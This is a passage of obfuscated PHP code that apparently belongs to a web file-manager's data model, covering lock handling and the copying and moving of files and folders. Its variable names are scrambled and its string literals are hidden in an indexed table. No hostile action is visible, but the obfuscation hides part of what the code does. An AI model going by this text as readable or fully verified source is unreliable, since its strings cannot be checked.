$©“ğòé[634]), $³¼ÖÖ‰˜); $this->_lockCheckEnd($©“ğòé[633], $ÑåãÓÕ­); } public function lockWriteEnd($ãÙ˜ä™’, $‰òÍ…¬ô = '') { $Ë®—£¹Á =& $_SERVER[¼’ç§¼´]; if (!$this->allowLock()) { return; } $ÕÕùö¬Ç = 0; $this->_lockKey($Ë®—£¹Á[637] . $ãÙ˜ä™’ . $Ë®—£¹Á[10] . $‰òÍ…¬ô, $ÕÕùö¬Ç); $this->_lockEvent($ãÙ˜ä™’, array($Ë®—£¹Á[632], $Ë®—£¹Á[634]), $ÕÕùö¬Ç); $this->_lockParent($ãÙ˜ä™’, array($Ë®—£¹Á[632], $Ë®—£¹Á[634]), $ÕÕùö¬Ç); } public function lockMoveStart($¸«–€û) { $•¡ûú•¡ =& $_SERVER[¼’ç§¼´]; if (!$this->allowLock()) { return; } $this->_lockCheck($•¡ûú•¡[634], $¸«–€û); $»û×è³Š = 1; $this->_lockKey($•¡ûú•¡[638] . $¸«–€û, $»û×è³Š); $this->_lockEvent($¸«–€û, array($•¡ûú•¡[632], $•¡ûú•¡[633]), $»û×è³Š); $this->_lockParent($¸«–€û, array($•¡ûú•¡[632], $•¡ûú•¡[634]), $»û×è³Š); $this->_lockEvent($¸«–€û, array($•¡ûú•¡[639], $•¡ûú•¡[635], $•¡ûú•¡[636]), $»û×è³Š); $this->_lockCheckEnd($•¡ûú•¡[634], $¸«–€û); } public function lockMoveEnd($íŒõØ¤) { $ëı’§ºô =& $_SERVER[¼’ç§¼´]; if (!$this->allowLock()) { return; } $²“¢öŒ• = 0; $this->_lockKey($ëı’§ºô[638] . $íŒõØ¤, $²“¢öŒ•); $this->_lockEvent($íŒõØ¤, array($ëı’§ºô[632], $ëı’§ºô[633]), $²“¢öŒ•); $this->_lockParent($íŒõØ¤, array($ëı’§ºô[632], $ëı’§ºô[634]), $²“¢öŒ•); $this->_lockEvent($íŒõØ¤, array($ëı’§ºô[639], $ëı’§ºô[635], $ëı’§ºô[636]), $²“¢öŒ•); } private function _lockCheck($¥¨È…Ë¯, $òĞÔÒö) { $é‰÷ªŠÆ =& $_SERVER[¼’ç§¼´]; $«²ÓÈô = $this->sourceInfo($òĞÔÒö); $¸İïœ÷Ø = $¥¨È…Ë¯ . $é‰÷ªŠÆ[10] . $òĞÔÒö; $this->_lockTimeStart[$¸İïœ÷Ø] = timeFloat(); if (!is_array($«²ÓÈô)) { return; } $ÜÕåŸî = LNG($é‰÷ªŠÆ[640]); CacheLock::setErrorMsg($é‰÷ªŠÆ[176] . htmlspecialchars($«²ÓÈô[$é‰÷ªŠÆ[32]]) . $é‰÷ªŠÆ[178] . $ÜÕåŸî); $this->_lockKey($¸İïœ÷Ø, 1); $this->_lockKey($¸İïœ÷Ø, 0); $Äœ®—õÅ = array_reverse($this->parentLevelArray($«²ÓÈô[$é‰÷ªŠÆ[595]])); foreach ($Äœ®—õÅ as $°â™úˆ¨) { $¸İïœ÷Ø = $¥¨È…Ë¯ . $é‰÷ªŠÆ[641] . $°â™úˆ¨; if (CacheLock::lockGet($é‰÷ªŠÆ[642] . $¸İïœ÷Ø)) { $«²ÓÈô = $this->sourceInfo($°â™úˆ¨); CacheLock::setErrorMsg($é‰÷ªŠÆ[176] . htmlspecialchars($«²ÓÈô[$é‰÷ªŠÆ[32]]) . $é‰÷ªŠÆ[178] . $ÜÕåŸî); $this->_lockKey($¸İïœ÷Ø, 1); $this->_lockKey($¸İïœ÷Ø, 0); } } } private function _lockCheckEnd($Ä¾Ì”“í, $«˜ÔµÀÜ) { $©˜ŸÌ® =& $_SERVER[¼’ç§¼´]; $æ®Â„¾È = $Ä¾Ì”“í . $©˜ŸÌ®[10] . $«˜ÔµÀÜ; CacheLock::setErrorMsg($©˜ŸÌ®[465]); if (!isset($this->_lockTimeStart[$æ®Â„¾È])) { return; } $Æ‰ğ—£‹ = timeFloat() - $this->_lockTimeStart[$æ®Â„¾È]; unset($this->_lockTimeStart[$æ®Â„¾È]); if ($Æ‰ğ—£‹ > 0.5) { unset(self::$cacheSourceInfo[$©˜ŸÌ®[544] . $«˜ÔµÀÜ]); } $îÃòœÕü = $this->sourceInfo($«˜ÔµÀÜ); if (!$îÃòœÕü) { show_json(LNG($©˜ŸÌ®[108]), !1); } } private function _lockParent($¤ãúÁà·, $Å³ééà, $í¯ÅÌ) { if (!$this->autoLockSet) { return; } $ªäº÷Å† = $this->sourceInfo($¤ãúÁà·); if (!is_array($ªäº÷Å†)) { return; } $óÎã‹¤° = array_reverse($this->parentLevelArray($ªäº÷Å†[$_SERVER[¼’ç§¼´][595]])); foreach ($óÎã‹¤° as $Åş÷¡©) { $this->_lockEvent($Åş÷¡©, $Å³ééà, $í¯ÅÌ); } } private function _lockEvent($ü†ûê«¹, $›¾³Ö‹, $Šğ¹Ï±¹) { $âÈßÈ— =& $_SERVER[¼’ç§¼´]; if (!$this->autoLockSet) { return; } foreach ($›¾³Ö‹ as $ìÃ óó°) { $úñÆôÈş = $ìÃ óó° . $âÈßÈ—[10] . $ü†ûê«¹; if ($Šğ¹Ï±¹ && CacheLock::lockGet($âÈßÈ—[642] . $úñÆôÈş)) { continue; } $this->_lockKey($úñÆôÈş, $Šğ¹Ï±¹); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¥Úßç›…, $ÄÁËîçÂ = 1) { $øç›Ù© = $_SERVER[¼’ç§¼´][642] . md5($¥Úßç›…); if ($ÄÁËîçÂ) { if (isset(self::$_lockItemArr[$øç›Ù©])) { return; } self::$_lockItemArr[$øç›Ù©] = 1; CacheLock::lock($øç›Ù©, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$øç›Ù©])) { return; } unset(self::$_lockItemArr[$øç›Ù©]); CacheLock::unlock($øç›Ù©); } } public function isParentOf($úÈ°èæü, $ĞÔ–Âü¶) { $åÇïƒ… =& $_SERVER[¼’ç§¼´]; $Ù€æ™ïÓ = $this->sourceInfo($úÈ°èæü); $ˆïŞ¨”Ù = $this->sourceInfo($ĞÔ–Âü¶); $ë•Ö¥şÈ = $Ù€æ™ïÓ[$åÇïƒ…[595]] . $Ù€æ™ïÓ[$åÇïƒ…[193]] . $åÇïƒ…[50]; $Ô¹Ğ²²… = $ˆïŞ¨”Ù[$åÇïƒ…[595]] . $ˆïŞ¨”Ù[$åÇïƒ…[193]] . $åÇïƒ…[50]; $«çÌññ = strpos($Ô¹Ğ²²…, $ë•Ö¥şÈ) === 0; return $«çÌññ; } private $targetIsDelete = 0; public function copy($ËÕî¯ì, $«Úâõ¡», $Åï ÜĞ› = REPEAT_REPLACE, $Ì‚ÚÓı = '') { $›Î¢³Â =& $_SERVER[¼’ç§¼´]; $‹Ê·î‹Ë = $this->sourceInfo($ËÕî¯ì); $üÓ´ÒçÃ = $this->sourceInfo($«Úâõ¡»); if (!$‹Ê·î‹Ë || !$üÓ´ÒçÃ || $üÓ´ÒçÃ[$›Î¢³Â[496]] != $›Î¢³Â[91]) { return !1; } if ($this->isParentOf($ËÕî¯ì, $«Úâõ¡»)) { return !1; } $Ùıøøóâ = $Ì‚ÚÓı ? $Ì‚ÚÓı : $‹Ê·î‹Ë[$›Î¢³Â[32]]; $this->lockCopyStart($ËÕî¯ì); $this->lockWriteStart($«Úâõ¡», $Ùıøøóâ); $»´‘è•˜ = array($›Î¢³Â[643] => array(), $›Î¢³Â[644] => array(), $›Î¢³Â[645] => array()); $this->targetIsDelete = intval($‹Ê·î‹Ë[$›Î¢³Â[516]]); $¼×Ï‰È¡ = $this->fileNameExistAuto($«Úâõ¡», $‹Ê·î‹Ë); $áŸ—Ìä¦ = $this->_copy($ËÕî¯ì, $«Úâõ¡», $Åï ÜĞ›, $»´‘è•˜, !0, $Ì‚ÚÓı); $this->_childrenListClear(); $this->lockCopyEnd($ËÕî¯ì); $this->lockWriteEnd($«Úâõ¡», $Ùıøøóâ); if ($‹Ê·î‹Ë[$›Î¢³Â[496]] == $›Î¢³Â[91] && $¼×Ï‰È¡ == $áŸ—Ìä¦) { $this->folderSizeResetChildren($¼×Ï‰È¡); } Model($›Î¢³Â[646])->addAll($»´‘è•˜[$›Î¢³Â[644]], array(), !0); if ($¼×Ï‰È¡ != $áŸ—Ìä¦ || $‹Ê·î‹Ë[$›Î¢³Â[496]] == $›Î¢³Â[91]) { Model($›Î¢³Â[647])->eventCopy($áŸ—Ìä¦); } $this->saveAll($»´‘è•˜[$›Î¢³Â[645]]); Model($›Î¢³Â[232])->linkAdd($»´‘è•˜[$›Î¢³Â[643]]); $this->folderSizeReset($«Úâõ¡»); $this->updateModifyTime($«Úâõ¡»); return $áŸ—Ìä¦; } private function _copy($œÛœŞÏå, $á·§ÍÉ·, $ªèü”ëÄ, &$‚”ŸùºÃ, $ç°·ş¦º, $Êæõ®È = '') { $ÄÇóæâ¶ =& $_SERVER[¼’ç§¼´]; $Úòàã›‡ = $this->sourceInfoCache($œÛœŞÏå); $ÎÂÆºÇ = $Úòàã›‡[$ÄÇóæâ¶[496]] == $ÄÇóæâ¶[91]; $Œåü•‰ = $Êæõ®È ? $Êæõ®È : $Úòàã›‡[$ÄÇóæâ¶[32]]; $ ½ÅÒåì = $this->fileNameExistAuto($á·§ÍÉ·, $Úòàã›‡); if ($ç°·ş¦º) { $this->_childrenAllMake($œÛœŞÏå); if ($ÎÂÆºÇ && $ ½ÅÒåì) { $this->_childrenAllMake($ ½ÅÒåì); } } if (!$ ½ÅÒåì) { return $this->_copyCreate($œÛœŞÏå, $á·§ÍÉ·, $Œåü•‰, $‚”ŸùºÃ); } $üÆ¯Ò‘ = $ ½ÅÒåì; if ($ÎÂÆºÇ) { if ($ªèü”ëÄ == REPEAT_RENAME_FOLDER) { $Œåü•‰ = $this->fileNameAutoCache($á·§ÍÉ·, $Œåü•‰, $ªèü”ëÄ, $ÎÂÆºÇ); $üÆ¯Ò‘ = $this->_copyCreate($œÛœŞÏå, $á·§ÍÉ·, $Œåü•‰, $‚”ŸùºÃ); } else { $Ê¢–Ù á = $this->_childrenList($œÛœŞÏå); foreach ($Ê¢–Ù á as $²±ÆÑ ) { $this->_copy($²±ÆÑ [$ÄÇóæâ¶[193]], $ ½ÅÒåì, $ªèü”ëÄ, $‚”ŸùºÃ, !1); } } } else { if ($ªèü”ëÄ == REPEAT_RENAME || $ªèü”ëÄ == REPEAT_RENAME_FOLDER) { $Œåü•‰ = $this->fileNameAutoCache($á·§ÍÉ·, $Œåü•‰, $ªèü”ëÄ, $ÎÂÆºÇ); $üÆ¯Ò‘ = $this->_copyCreate($œÛœŞÏå, $á·§ÍÉ·, $Œåü•‰, $‚”ŸùºÃ); } else { if ($ªèü”ëÄ == REPEAT_REPLACE) { $²ö˜ç›ı = $this->sourceInfoCache($ ½ÅÒåì); $ƒÊ€ç³ = $this->fileHistory($²ö˜ç›ı, $Úòàã›‡[$ÄÇóæâ¶[552]], $Úòàã›‡[$ÄÇóæâ¶[79]]); if ($ƒÊ€ç³) { $‚”ŸùºÃ[$ÄÇóæâ¶[643]][] = $Úòàã›‡[$ÄÇóæâ¶[552]]; } } else { if ($ªèü”ëÄ == REPEAT_SKIP) { } } } Hook::trigger($ÄÇóæâ¶[648], array($ÄÇóæâ¶[649], $Úòàã›‡, 0)); } return $üÆ¯Ò‘; } private function _copyCreate($³ªÄ’, $¡Ùâƒ°£, $Æ¤‡¢Š«, &$ã¢âÀÁæ) { $¦ıßƒÕî =& $_SERVER[¼’ç§¼´]; $»¿­Ì‰¾ = $this->sourceInfoCache($³ªÄ’); $Ö³Û¹â = $this->sourceInfoCache($¡Ùâƒ°£); $ÒˆÅ–£ = $this->_makeItemData($»¿­Ì‰¾, $Ö³Û¹â, $Æ¤‡¢Š«); Hook::trigger($¦ıßƒÕî[650], $ÒˆÅ–£); Hook::trigger($¦ıßƒÕî[651], array($¦ıßƒÕî[652], $ÒˆÅ–£, 0)); $ğä³á–Ë = $this->add($ÒˆÅ–£); $×‹‚ç¤ = array($¦ıßƒÕî[193] => $ğä³á–Ë, $¦ıßƒÕî[32] => $Æ¤‡¢Š«); $this->_copyApplyMeta($×‹‚ç¤, $ã¢âÀÁæ); if ($»¿­Ì‰¾[$¦ıßƒÕî[496]] != $¦ıßƒÕî[91]) { $ã¢âÀÁæ[$¦ıßƒÕî[643]][] = $»¿­Ì‰¾[$¦ıßƒÕî[552]]; return $ğä³á–Ë; } $½ãÈ¡ô® = array(); $ÈÅ¦¸Ò‘ = array(); $this->_childrenListAll($³ªÄ’, $½ãÈ¡ô®); $Õ¼’²†— = count($½ãÈ¡ô®); if ($Õ¼’²†— == 0) { return $ğä³á–Ë; } $Ë¹æ–é = $this->sourceInfo($ğä³á–Ë); foreach ($½ãÈ¡ô® as $æí¯ÏÆ÷) { $‚¬–ÔËª = $this->_makeItemData($æí¯ÏÆ÷, $Ë¹æ–é, $æí¯ÏÆ÷[$¦ıßƒÕî[32]]); $‚¬–ÔËª[$¦ıßƒÕî[595]] = $æí¯ÏÆ÷[$¦ıßƒÕî[595]]; $ÈÅ¦¸Ò‘[] = $‚¬–ÔËª; } $this->chunkEventSet($¦ıßƒÕî[653], array($¦ıßƒÕî[654], $ÒˆÅ–£, $Õ¼’²†—)); $this->addAll($ÈÅ¦¸Ò‘, array(), !1); $Ğğˆ¢ú = $this->where(array($¦ıßƒÕî[192] => $ğä³á–Ë))->select(); $Ã°–ë®í = $this->_childrenMakeRelation($½ãÈ¡ô®, $Ğğˆ¢ú); $Ã°–ë®í[$³ªÄ’] = $ğä³á–Ë; $ŞœöÉÁæ = array(); $Á×Äš«Ï = array(); foreach ($Ğğˆ¢ú as $æí¯ÏÆ÷) { $ªÓ¶ ™ø = $æí¯ÏÆ÷[$¦ıßƒÕî[193]]; $Í»à×á = $this->_childrenMatch($Ã°–ë®í, $æí¯ÏÆ÷, $Ë¹æ–é); $ŞœöÉÁæ[] = array($¦ıßƒÕî[193], $ªÓ¶ ™ø, $¦ıßƒÕî[192], $Í»à×á[$¦ıßƒÕî[192]]); $Á×Äš«Ï[] = array($¦ıßƒÕî[193], $ªÓ¶ ™ø, $¦ıßƒÕî[595], $Í»à×á[$¦ıßƒÕî[595]]); $this->_copyApplyMeta($æí¯ÏÆ÷, $ã¢âÀÁæ); if ($æí¯ÏÆ÷[$¦ıßƒÕî[496]] != $¦ıßƒÕî[91]) { $ã¢âÀÁæ[$¦ıßƒÕî[643]][] = $æí¯ÏÆ÷[$¦ıßƒÕî[552]]; } } $this->chunkEventSet($¦ıßƒÕî[655], array($¦ıßƒÕî[656], $ÒˆÅ–£, $Õ¼’²†—)); $this->saveAll($ŞœöÉÁæ); $this->chunkEventSet($¦ıßƒÕî[657], array($¦ıßƒÕî[658], $ÒˆÅ–£, $Õ¼’²†—)); $this->saveAll($Á×Äš«Ï); return $ğä³á–Ë; } private function _childrenMakeRelation($è«š¸„, $Ñ—óËì) { $Şôú’Çï =& $_SERVER[¼’ç§¼´]; $È˜»²„¹ = array(); $Ü£º¸’ = array(); foreach ($è«š¸„ as $ëäô¶Øø) { $“¤ßéˆé = $ëäô¶Øø[$Şôú’Çï[32]] . $Şôú’Çï[8] . $ëäô¶Øø[$Şôú’Çï[595]]; $È˜»²„¹[$“¤ßéˆé] = $ëäô¶Øø[$Şôú’Çï[193]]; } foreach ($Ñ—óËì as $ëäô¶Øø) { $“¤ßéˆé = $ëäô¶Øø[$Şôú’Çï[32]] . $Şôú’Çï[8] . $ëäô¶Øø[$Şôú’Çï[595]]; $ ÷°³ = $È˜»²„¹[$“¤ßéˆé]; $Ü£º¸’[$ ÷°³] = $ëäô¶Øø[$Şôú’Çï[193]]; } return $Ü£º¸’; } private function _childrenMatch($ÀÔŸÁ, $»äóéÀ, $»¤ä´¼¾) { $Ê°°Ø½ =& $_SERVER[¼’ç§¼´]; $‡‡Ú´ö¤ = $»¤ä´¼¾[$Ê°°Ø½[595]]; $ë•§´È = $this->parentLevelArray($»äóéÀ[$Ê°°Ø½[595]]); foreach ($ë•§´È as $‰æşÛàÉ) { if (isset($ÀÔŸÁ[$‰æşÛàÉ])) { $‡‡Ú´ö¤ .= $ÀÔŸÁ[$‰æşÛàÉ] . $Ê°°Ø½[659]; } } $‡‡Ú´ö¤ = rtrim($‡‡Ú´ö¤, $Ê°°Ø½[50]) . $Ê°°Ø½[50]; $¼§•°’ = $this->parentLevelArray($‡‡Ú´ö¤); $¡„¤™ = $¼§•°’[count($¼§•°’) - 1]; return array($Ê°°Ø½[192] => $¡„¤™, $Ê°°Ø½[595] => $‡‡Ú´ö¤); } private function _makeItemData($×ÜŒ†ô‡, $Î‡äÉ¬×, $×Î§â­Œ) { $åğü¥’‘ =& $_SERVER[¼’ç§¼´]; $‰æºóüÛ = array($åğü¥’‘[660] => $×ÜŒ†ô‡[$åğü¥’‘[496]], $åğü¥’‘[505] => $×Î§â­Œ, $åğü¥’‘[661] => $×ÜŒ†ô‡[$åğü¥’‘[497]] ? $×ÜŒ†ô‡[$åğü¥’‘[497]] : $åğü¥’‘[12], $åğü¥’‘[553] => $×ÜŒ†ô‡[$åğü¥’‘[552]] ? $×ÜŒ†ô‡[$åğü¥’‘[552]] : 0, $åğü¥’‘[631] => $×ÜŒ†ô‡[$åğü¥’‘[79]] ? $×ÜŒ†ô‡[$åğü¥’‘[79]] : 0, $åğü¥’‘[662] => intval($Î‡äÉ¬×[$åğü¥’‘[190]]), $åğü¥’‘[663] => intval($Î‡äÉ¬×[$åğü¥’‘[580]]), $åğü¥’‘[664] => intval(USER_ID), $åğü¥’‘[665] => intval(USER_ID), $åğü¥’‘[488] => intval($Î‡äÉ¬×[$åğü¥’‘[193]]), $åğü¥’‘[666] => $Î‡äÉ¬×[$åğü¥’‘[595]] . $Î‡äÉ¬×[$åğü¥’‘[193]] . $åğü¥’‘[50], $åğü¥’‘[509] => $×ÜŒ†ô‡[$åğü¥’‘[88]] ? $×ÜŒ†ô‡[$åğü¥’‘[88]] : time(), $åğü¥’‘[515] => 0, $åğü¥’‘[667] => $åğü¥’‘[12]); return $‰æºóüÛ; } private function _copyApplyMeta($½¼ôÔƒº, &$õ¦²Ñ) { $¤ìµœÂ =& $_SERVER[¼’ç§¼´]; $û°…Å–¡ = $½¼ôÔƒº[$¤ìµœÂ[193]]; $ûÂª‹Úš = $½¼ôÔƒº[$¤ìµœÂ[32]]; if (!isset($½¼ôÔƒº[$¤ìµœÂ[668]]) || !$½¼ôÔƒº[$¤ìµœÂ[668]] || $½¼ôÔƒº[$¤ìµœÂ[668]] == $¤ìµœÂ[230]) { $õ¦²Ñ[$¤ìµœÂ[645]][] = array($¤ìµœÂ[193], $û°…Å–¡, $¤ìµœÂ[668], short_id($û°…Å–¡)); } if (Input::check($ûÂª‹Úš, $¤ìµœÂ[669])) { $õ¦²Ñ[$¤ìµœÂ[644]][] = array($¤ìµœÂ[193] => $û°…Å–¡, $¤ìµœÂ[97] => $¤ìµœÂ[549], $¤ìµœÂ[461] => str_replace($¤ìµœÂ[53], $¤ìµœÂ[12], Pinyin::get($ûÂª‹Úš))); $õ¦²Ñ[$¤ìµœÂ[644]][] = array($¤ìµœÂ[193] => $û°…Å–¡, $¤ìµœÂ[97] => $¤ìµœÂ[548], $¤ìµœÂ[461] => Pinyin::get($ûÂª‹Úš, $¤ìµœÂ[670])); } $õ¦²Ñ[$¤ìµœÂ[644]][] = array($¤ìµœÂ[193] => $û°…Å–¡, $¤ìµœÂ[97] => $¤ìµœÂ[528], $¤ìµœÂ[461] => KodSort::makeStr($ûÂª‹Úš)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($«§í²åÙ) { $©¥ú°Ñ =& $_SERVER[¼’ç§¼´]; $÷•Ã‡Ó« = $this->sourceInfo($«§í²åÙ); $ÂñşÉ’à = $©¥ú°Ñ[671]; $»ÈôÄ°³ = array($©¥ú°Ñ[595] => array($©¥ú°Ñ[626], $÷•Ã‡Ó«[$©¥ú°Ñ[595]] . $«§í²åÙ . $©¥ú°Ñ[627]), $©¥ú°Ñ[516] => $this->targetIsDelete); $²ùÛ€è = $this->field($ÂñşÉ’à)->where($»ÈôÄ°³)->select(); if (!$²ùÛ€è) { return; } $²ùÛ€è = array_to_keyvalue($²ùÛ€è, $©¥ú°Ñ[193]); foreach ($²ùÛ€è as $ßøË‚Œ) { $‡·…âÁ— = $ßøË‚Œ[$©¥ú°Ñ[192]]; $«§í²åÙ = $ßøË‚Œ[$©¥ú°Ñ[193]]; if (!isset($this->_childrenListCache[$«§í²åÙ]) && $ßøË‚Œ[$©¥ú°Ñ[496]] == $©¥ú°Ñ[91]) { $this->_childrenListCache[$«§í²åÙ] = array(); } if (!isset($this->_childrenListCache[$‡·…âÁ—])) { $this->_childrenListCache[$‡·…âÁ—] = array(); } $this->_childrenListCache[$‡·…âÁ—][$«§í²åÙ] = $ßøË‚Œ; $this->_childrenItemCache[$«§í²åÙ] = $ßøË‚Œ; } } private function _childrenListAll($ıí£çÛæ, &$Ï‰¨Å©) { $¤ÅˆˆÂú =& $_SERVER[¼’ç§¼´]; if (!isset($this->_childrenListCache[$ıí£çÛæ])) { return; } $×ºŸ•¬‡ = $this->_childrenListCache[$ıí£çÛæ]; foreach ($×ºŸ•¬‡ as $¦æœğÕ“ => $Šë¼©Ç–) { $Ï‰¨Å©[$¦æœğÕ“] = $Šë¼©Ç–; if ($Šë¼©Ç–[$¤ÅˆˆÂú[496]] == $¤ÅˆˆÂú[91]) { $this->_childrenListAll($¦æœğÕ“, $Ï‰¨Å©); } } } private function sourceInfoCache($ÃğÇäÓ¯) { if (isset($this->_childrenItemCache[$ÃğÇäÓ¯])) { return $this->_childrenItemCache[$ÃğÇäÓ¯]; } return $this->sourceInfo($ÃğÇäÓ¯); } private function _childrenList($‡øßå›å) { if (isset($this->_childrenListCache[$‡øßå›å])) { return $this->_childrenListCache[$‡øßå›å]; } return $this->_childrenListSelect($‡øßå›å); } private function _childrenListSelect($íôğ¬è·) { $›è’ÇÄ =& $_SERVER[¼’ç§¼´]; $Çıó¦¹ = array($›è’ÇÄ[192] => $íôğ¬è·, $›è’ÇÄ[516] => $this->targetIsDelete); $š²×ëòÑ = $this->where($Çıó¦¹)->select(); $š²×ëòÑ = $š²×ëòÑ ? $š²×ëòÑ : array(); $Çà†à« = array_to_keyvalue($š²×ëòÑ, $›è’ÇÄ[193]); $this->_childrenListCache[$íôğ¬è·] = $Çà†à«; foreach ($Çà†à« as $íôğ¬è· => $Îš¹¦½Ñ) { $this->_childrenItemCache[$íôğ¬è·] = $Îš¹¦½Ñ; } return $Çà†à«; } private function fileNameExistAuto($“ñ¨¢âÏ, $ñò•äò‡) { $Ğ‰ØÔÛ =& $_SERVER[¼’ç§¼´]; if ($ñò•äò‡[$Ğ‰ØÔÛ[516]] == $Ğ‰ØÔÛ[91]) { return $this->fileNameExist($“ñ¨¢âÏ, $ñò•äò‡[$Ğ‰ØÔÛ[32]]); } return $this->fileNameExistCache($“ñ¨¢âÏ, $ñò•äò‡[$Ğ‰ØÔÛ[32]]); } private function fileNameExistCache($é§µš°·, $ÈÄƒô¯¥) { $˜ÏüÖ¹ğ =& $_SERVER[¼’ç§¼´]; $ÈÄƒô¯¥ = strtolower($ÈÄƒô¯¥); $‚”•ä›ã = $this->_childrenList($é§µš°·); foreach ($‚”•ä›ã as $ğ¨şñ–) { if ($ÈÄƒô¯¥ == strtolower($ğ¨şñ–[$˜ÏüÖ¹ğ[32]])) { return $ğ¨şñ–[$˜ÏüÖ¹ğ[193]]; } } return !1; } private function fileNameAutoCache($ÃÏ¿ƒé, $—Ä³§š, $°öòã¡, $™„¬¸º“) { $©®„ÌÌ– =& $_SERVER[¼’ç§¼´]; $¸½Ó—İÃ = $this->_childrenList($ÃÏ¿ƒé); $ÚóõÕ¾ = array_to_keyvalue($¸½Ó—İÃ, $©®„ÌÌ–[12], $©®„ÌÌ–[32]); return $this->fileNameAutoGet($ÚóõÕ¾, $—Ä³§š, $°öòã¡, $™„¬¸º“); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($“ê¼ã°¼, $ÍÖÊüºµ, $ñ¯şë»ç = REPEAT_REPLACE, $¢•™Çß = '') { $’ïà‘¬‚ =& $_SERVER[¼’ç§¼´]; $’Î†ş = $this->sourceInfo($“ê¼ã°¼); $ïèªĞúû = $this->sourceInfo($ÍÖÊüºµ); if ($’Î†ş[$’ïà‘¬‚[192]] == $ïèªĞúû[$’ïà‘¬‚[193]]) { if ($’Î†ş[$’ïà‘¬‚[516]] == $’ïà‘¬‚[91]) { Model($’ïà‘¬‚[514])->restore(array($“ê¼ã°¼)); } if (!$¢•™Çß || $¢•™Çß == $’Î†ş[$’ïà‘¬‚[32]]) { return $“ê¼ã°¼; } } $¤¬ÈïÈ = $this->pathInfoMore($“ê¼ã°¼); if ($this->isParentOf($“ê¼ã°¼, $ÍÖÊüºµ)) { return !1; } if (!$’Î†ş || !$ïèªĞúû || $ïèªĞúû[$’ïà‘¬‚[496]] != $’ïà‘¬‚[91]) { return !1; } Hook::trigger($’ïà‘¬‚[672], $¤¬ÈïÈ); $this->targetIsDelete = intval($’Î†ş[$’ïà‘¬‚[516]]); if ($’Î†ş[$’ïà‘¬‚[192]] == $ÍÖÊüºµ && $¢•™Çß != $’Î†ş[$’ïà‘¬‚[32]]) { $í¢”š×— = $this->fileNameExist($ÍÖÊüºµ, $¢•™Çß); if ($í¢”š×— && $’Î†ş[$’ïà‘¬‚[496]] == $’ïà‘¬‚[230]) { $Œºù›‡ì = $this->sourceInfo($í¢”š×—); $ˆÊŸ¦Ô­ = $this->fileHistory($Œºù›‡ì, $’Î†ş[$’ïà‘¬‚[552]], $’Î†ş[$’ïà‘¬‚[79]]); if (!$ˆÊŸ¦Ô­) { Model($’ïà‘¬‚[555])->remove($’Î†ş[$’ïà‘¬‚[552]]); } $this->removeNow($“ê¼ã°¼, !1); $this->folderSizeReset($ÍÖÊüºµ); Hook::trigger($’ïà‘¬‚[673], $¤¬ÈïÈ); return $í¢”š×—; } } $ŠÒÇ®Á = $¢•™Çß ? $¢•™Çß : $’Î†ş[$’ïà‘¬‚[32]]; $this->lockMoveStart($“ê¼ã°¼); $this->lockWriteStart($ÍÖÊüºµ, $ŠÒÇ®Á); $Ø‰Äßğá = array($’ïà‘¬‚[643] => array(), $’ïà‘¬‚[674] => !1); $this->clearShare($“ê¼ã°¼, $ÍÖÊüºµ); $Û‘­ŸßÂ = $this->fileNameExistAuto($ÍÖÊüºµ, $’Î†ş); $Å¯Ù¿€ = $this->_move($“ê¼ã°¼, $ÍÖÊüºµ, $ñ¯şë»ç, $Ø‰Äßğá, $¢•™Çß); $this->sourceCacheClear(); if ($’Î†ş[$’ïà‘¬‚[496]] == $’ïà‘¬‚[91] && $Û‘­ŸßÂ) { $this->folderSizeResetChildren($Å¯Ù¿€); } Model($’ïà‘¬‚[232])->linkAdd($Ø‰Äßğá[$’ïà‘¬‚[643]]); if ($Å¯Ù¿€ && $Û‘­ŸßÂ && $Ø‰Äßğá[$’ïà‘¬‚[674]]) { $š½–Õ§É = $’Î†ş[$’ïà‘¬‚[496]] == $’ïà‘¬‚[91] ? $this->_childrenListSelect($“ê¼ã°¼) : !1; $šáƒ‘ä = $š½–Õ§É && count($š½–Õ§É) > 0 ? !0 : !1; $this->removeNow($“ê¼ã°¼, $šáƒ‘ä); } $this->lockMoveEnd($“ê¼ã°¼); $this->lockWriteEnd($ÍÖÊüºµ, $ŠÒÇ®Á); $this->folderSizeReset($’Î†ş[$’ïà‘¬‚[192]]); $this->folderSizeReset($ÍÖÊüºµ); $Œƒù”Ş° = array($’Î†ş[$’ïà‘¬‚[192]], $ÍÖÊüºµ); if ($’Î†ş[$’ïà‘¬‚[496]] == $’ïà‘¬‚[91]) { $Œƒù”Ş°[] = $“ê¼ã°¼; } $this->updateModifyTime($Œƒù”Ş°); Model($’ïà‘¬‚[647])->eventMove($“ê¼ã°¼, $’Î†ş[$’ïà‘¬‚[192]], $ÍÖÊüºµ); Hook::trigger($’ïà‘¬‚[673], $¤¬ÈïÈ); return $Å¯Ù¿€; } private function _move($†Á‚ÀÜµ, $Ñ«·Ú€, $ÇÜ½ˆ‡, &$„º©ƒ¬Ó, $Ñè‚‚‡‚ = '') { $èú¼¡ëÛ =& $_SERVER[¼’ç§¼´]; $ğæŠ‡œ× = $this->sourceInfo($†Á‚ÀÜµ); $— ìÅ÷½ = $ğæŠ‡œ×[$èú¼¡ëÛ[496]] == $èú¼¡ëÛ[91]; $ğö…£Ï = $Ñè‚‚‡‚ ? $Ñè‚‚‡‚ : $ğæŠ‡œ×[$èú¼¡ëÛ[32]]; $—ÜÄ‚—Š = $this->fileNameExistAuto($Ñ«·Ú€, $ğæŠ‡œ×); $this->lockMoveStart($†Á‚ÀÜµ); $this->lockWriteStart($Ñ«·Ú€, $ğö…£Ï); if (!$—ÜÄ‚—Š) { return $this->_moveForce($†Á‚ÀÜµ, $Ñ«·Ú€, $ğö…£Ï); } $úµ…‚ıË = $—ÜÄ‚—Š; $Î­•¿Í‘ = !1; if ($— ìÅ÷½) { if ($ÇÜ½ˆ‡ == REPEAT_RENAME_FOLDER) { $ğö…£Ï = $this->fileNameAuto($Ñ«·Ú€, $ğö…£Ï, $ÇÜ½ˆ‡, $— ìÅ÷½); $úµ…‚ıË = $this->_moveForce($†Á‚ÀÜµ, $Ñ«·Ú€, $ğö…£Ï); } else { $ƒÙâü«ô = $this->_childrenListSelect($†Á‚ÀÜµ); foreach ($ƒÙâü«ô as $Ñî‚ç¥¶) { $Ú–ø¸™˜ = REPEAT_REPLACE; 